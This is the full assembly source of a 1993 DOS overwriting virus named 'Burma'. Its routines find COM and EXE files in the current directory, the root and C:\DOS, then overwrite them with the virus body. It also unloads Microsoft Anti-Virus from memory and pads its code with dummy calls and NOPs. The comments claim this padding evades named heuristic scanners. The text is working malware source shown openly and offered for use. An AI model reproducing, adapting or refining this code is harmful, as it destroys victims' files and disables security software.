; The Burma Virus is an overwriting virus that will write to one
; EXE and one COM in the directory it is executed in, then it
; will drop back to the root directory and write another COM and
; EXE. Once this is done, it will default to C:\DOS and write
; still another COM and EXE. There is no destructive code in this
; virus, yet it does overwrite and resize the host file to the
; size of itself.. Wooo! The video pattern is essentially the same
; routine as that which is found in the NuKE Infojournal 4. It
; will display on every single execution of this virus. Obviously!
; The only other psuedo-interesting thing about this virus is
; that it will knock MAV out of memory. This routine is called
; VSLAY and is credited to Urnst Kouch of CRyPT Info Systems.

; Virus creation date: 7/4/1993
; Purpose:in honor of Burma's day of independence from Iceland.
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
info_1e         equ     9Eh
info_15e        equ     0A0h
info_16e        equ     798h

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;               LET THE FESTIVITIES BEGIN!!!
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

                org     100h

burma       proc    far

start:
                call    heuristcs_fool_1        ; Use multiple calls to
                call    heuristcs_fool_2        ; fool heuristic type
                call    heuristcs_fool_4        ; scanners. This has been
                call    heuristcs_fool_5        ; proven effective in
                call    heuristcs_fool_6        ; evading detection by
                call    heuristcs_fool_4        ; TBSCAN v6.03
                call    heuristcs_fool_7        ; FPROT v2.08a
                call    heuristcs_fool_5        ; McAfee v1.06
                call    heuristcs_fool_3        ;
                call    heuristcs_fool_4        ;
                call    heuristcs_fool_5        ;
                call    heuristcs_fool_6        ;
                call    heuristcs_fool_4        ;
                call    heuristcs_fool_7        ;
                call    heuristcs_fool_5        ;
                jmp     point_8

burma       endp

;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;               ROUTINE TO WIPE MiCROSOFT ANTI-ViRUS FROM MEMORY
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heuristcs_fool_1           proc    near
                mov     ax,0FA01h               ; This routine is called
                mov     dx,5945h                ; VSLAY and was first
                int     16h                     ; introduced by CRyPT
        retn
heuristcs_fool_1           endp


;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;               THANKS TO ROCK STEADY of NuKE FOR THIS VIDEO ROUTINE
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heuristcs_fool_2           proc    near
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ss
        push    sp
        mov ax,0B800h
        mov es,ax
                mov     info_8,0Ch
                mov     info_4,0D0h
point_1:
                mov     ax,info_4
                mov     info_5,ax
point_2:
                mov     info_6,39h
                mov     info_7,1
                mov     di,info_16e
        nop
                mov     ax,info_8
                mov     info_3,ax
point_3:
                mov     cx,info_6
        dec cx
        push    ds
        push    es
        pop ds
        mov si,di
        add si,2
                cld
                rep     movsw
        pop ds
                mov     cx,info_7
        push    ds
        push    es
        pop ds
        mov si,di
        sub si,0A0h
        mov ax,0A2h
                cld

locloop_4:
                movsw
        sub di,ax
        sub si,ax
                loop    locloop_4               

        pop ds
                mov     cx,info_6
        push    ds
        push    es
        pop ds
        mov si,di
        sub si,2
                std
                rep     movsw
        pop ds
                mov     cx,info_7
        inc cx
        push    ds
        push    es
        pop ds
        mov si,di
                add     si,info_15e
        mov ax,0A2h
                std

locloop_5:
                movsw
        add di,ax
        add si,ax
                loop    locloop_5

        pop ds
                add     info_6,2
                add     info_7,2
                dec     info_3
                jnz     point_3
                dec     info_5
                jz      point_6
                jmp     point_2
point_6:
                sub     info_4,8
                dec     info_8
                jz      point_7
                jmp     point_1
point_7:
        pop sp
        pop ss
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        retn
heuristcs_fool_2           endp


;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;               ROUTINE FOR DIRECTORY CHANGE
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heuristcs_fool_3           proc    near
                mov     ah,3Bh                  ; Sets the current PATH
                mov     dx,offset info_12       ; Info to tell the ViRUS
                int     21h                     ; where to go.

        retn
heuristcs_fool_3           endp


;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;               HERE'S THE ViRUS PORTION OF THIS FILE!!!
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heuristcs_fool_4           proc    near
                mov     cx,2                    ; Take any attributes
                mov     ah,4Eh                  ; Find the first file that
                mov     dx,offset info_10       ; meets this criteria
                int     21h                     ; DO IT!
                                                ;
                mov     ah,3Ch                  ; DOS file create function to
                xor     cx,cx                   ; be used in the simple
                mov     dx,info_1e              ; overwriting of a file...
                int     21h                     ; DO IT!
                                                ;
                mov     bh,40h                  ; 40HEX  Look it up!
                xchg    ax,bx                   ; Write to function of DOS.
                mov     dx,100h                 ; DX tells us where to start.
                mov     cx,1BAh                 ; CX gives us the size and
                int     21h                     ; DO IT!

                retn                            ; Return to caller
heuristcs_fool_4           endp


;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;  SAME ROUTINE AS ABOVE, BUT NOPs ARE USED TO SCREW HEURISTICS SCANNERS
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heuristcs_fool_5           proc    near
                mov     cx,2                    ; Take any attributes
                nop                             ; No Operation
                mov     ah,4Eh                  ; Find the first file that
                nop                             ; No Operation
                mov     dx,offset info_11       ; meets this criteria
                nop                             ; No Operation
                int     21h                     ; DO IT!
                                                ;
                nop                             ; No Operation
                mov     ah,3Ch                  ; DOS file create function to
                nop                             ; No Operation
                xor     cx,cx                   ; be used in the simple
                nop                             ; No Operation
                mov     dx,info_1e              ; overwriting of a file...
                nop                             ; No Operation
                int     21h                     ; DO IT!
                                                ;
                nop                             ; No Operation
                mov     bh,40h                  ; 40HEX  Look it up!
                nop                             ; No Operation
                xchg    ax,bx                   ; Write to function of DOS.
                nop                             ; No Operation
                mov     dx,100h                 ; DX tells us where to start.
                nop                             ; No Operation
                mov     cx,1BAh                 ; CX gives us the size
                nop                             ; No Operation
                int     21h                     ; DO IT!

                nop                             ; No Operation
                retn                            ;
heuristcs_fool_5           endp

point_8:
                mov     ah,9                    ; Let's print our "CUTESY"
                mov     dx,offset info_13       ; shit to the screen
                int     21h                     ; DO IT!

;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;              ROUTINE FOR FINDING FIRST NEXT
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heuristcs_fool_6           proc    near
                mov     cx,2                    ; Any attribute
                mov     ah,4Fh                  ; Find next file that meets
                mov     dx,288h                 ; this criteria
                nop                             ; No Operation
                int     21h                     ; DO IT! DOS

                retn                            ; Return to caller
heuristcs_fool_6           endp


;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
;               ROUTINE FOR FINDING FIRST NEXT
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

heuristcs_fool_7           proc    near
                mov     cx,2                    ; Any attribute
                mov     ah,4Fh                  ; Find next file that meets
                mov     dx,28Eh                 ; this criteria
                nop                             ; No Operation
                int     21h                     ; DO IT!

                retn                            ; Return to caller
heuristcs_fool_7           endp

info_3          dw      0
info_4          dw      0
info_5          dw      0
info_6          dw      0
info_7          dw      0
info_8          dw      0
        db  24 dup (0)
info_10         db      '*.?x?',0
info_11         db      '*.?o?',0
info_12         db      '\DOS',0
info_13         db      '[Tempest - �]', 0Dh, 0Ah, '$'
        db  'Rangoon, Burma'
        db  0

seg_a       ends

        end start
        